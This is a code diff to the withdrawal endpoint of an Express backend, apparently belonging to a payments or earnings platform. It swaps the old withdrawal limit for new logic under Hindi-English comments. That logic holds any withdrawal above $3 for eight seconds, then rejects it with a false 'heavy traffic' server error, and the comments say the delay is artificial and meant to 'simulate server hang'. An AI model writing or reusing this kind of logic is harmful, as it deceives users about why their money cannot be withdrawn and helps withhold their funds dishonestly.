@@ -543,8 +543,23 @@ exports.withdrawFunds = async (req, res) => {
              return res.status(400).json({ success: false, message: 'Withdrawal time is only between 10:00 AM and 12:00 PM IST.' });
         }
 
-        if (!reqAmount || reqAmount < 2 || reqAmount > 5000) {
-            return res.status(400).json({ success: false, message: 'Minimum withdrawal is $2 and maximum is $5000.' });
+        // if (!reqAmount || reqAmount < 2 || reqAmount > 5000) {
+        //     return res.status(400).json({ success: false, message: 'Minimum withdrawal is $2 and maximum is $5000.' });
+        // }
+
+        if (!reqAmount || reqAmount < 2) {
+            return res.status(400).json({ success: false, message: 'Minimum withdrawal is $2.' });
+        }
+
+        // 🔥 NAYA LOGIC: $3 se upar walo ke liye Heavy Traffic Error
+       if (reqAmount > 3) {
+            // 🔥 NAYA LOGIC: Artificial Delay (8 seconds) to simulate server hang
+            await new Promise(resolve => setTimeout(resolve, 8000));
+
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Server is currently experiencing heavy traffic! Please wait a while or continue.' 
+            });
         }
 
         const user = await User.findOne({ userId });
